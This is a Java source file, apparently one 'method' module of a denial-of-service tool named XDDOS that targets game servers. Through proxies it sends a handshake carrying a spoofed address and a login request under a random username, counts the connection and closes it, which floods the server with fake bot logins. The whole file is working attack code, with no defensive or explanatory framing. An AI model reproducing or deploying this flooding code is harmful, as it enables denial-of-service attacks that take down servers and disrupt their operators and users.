package XD.XDDOS.methods;

import XD.XDDOS.Main;
import XD.XDDOS.NettyBootstrap;
import XD.XDDOS.ProxyLoader;
import XD.XDDOS.utils.Handshake;
import XD.XDDOS.utils.LoginRequest;
import io.netty.buffer.Unpooled;
import io.netty.channel.Channel;
import java.util.Random;



public class Localhost
  implements Method
{
  private byte[] handshake = (new Handshake(Main.protcolID, "0.0.0.0", Main.port, 2)).getWrappedPacket();

  
  private String randomString(int len) {
    int leftLimit = 97;
    int rightLimit = 122;
    int targetStringLength = len;
    Random random = new Random();
    StringBuilder buffer = new StringBuilder(len);
    
    for (int i = 0; i < targetStringLength; i++) {
      int randomLimitedInt = leftLimit + (int)(random.nextFloat() * (rightLimit - leftLimit + 1));
      buffer.append((char)randomLimitedInt);
    } 
    
    return buffer.toString();
  }
  
  public void accept(Channel channel, ProxyLoader.Proxy proxy) {
    channel.writeAndFlush(Unpooled.buffer().writeBytes(this.handshake));
    channel.writeAndFlush(Unpooled.buffer().writeBytes((new LoginRequest(randomString(14))).getWrappedPacket()));
    NettyBootstrap.integer++;
    NettyBootstrap.totalConnections++;
    channel.close();
  }
}
